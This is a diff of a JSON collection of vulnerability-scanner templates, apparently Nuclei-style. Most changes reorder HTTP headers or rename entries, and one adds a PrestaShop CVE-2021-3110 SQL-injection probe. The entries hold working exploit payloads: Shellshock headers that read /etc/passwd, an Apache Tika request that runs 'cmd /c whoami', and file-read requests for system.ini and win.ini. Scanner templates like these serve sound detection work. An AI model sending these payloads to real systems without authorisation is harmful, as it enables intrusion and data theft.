@@ -3421,9 +3421,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -4776,7 +4776,7 @@
     {
       "id": "CVE-2016-10033",
       "info": {
-        "name": "WordPress PHPMailer < 5.2.18 Remote Code Execution",
+        "name": "WordPress PHPMailer < 5.2.18 - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6801,11 +6801,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
             "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "X-Tika-OCRLanguage": "//E:Jscript",
+            "Expect": "100-continue",
+            "Content-type": "image/jp2"
           },
           "method": "PUT",
           "path": [
@@ -12397,9 +12397,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -16615,6 +16615,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/AvalancheWeb/image?imageFilePath=C:/windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-3110",
+      "info": {
+        "name": "PrestaShop 1.7.7.0 SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 20s\nGET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products[]=1%20AND%20(SELECT%203875%20FROM%20(SELECT(SLEEP(6)))xoOt) HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -21176,7 +21190,7 @@
     {
       "id": "CVE-2022-25323",
       "info": {
-        "name": "ZEROF Web Server 2.0 Cross-Site Scripting",
+        "name": "ZEROF Web Server 2.0 - Cross-Site Scripting",
         "severity": "medium"
       },
       "requests": [
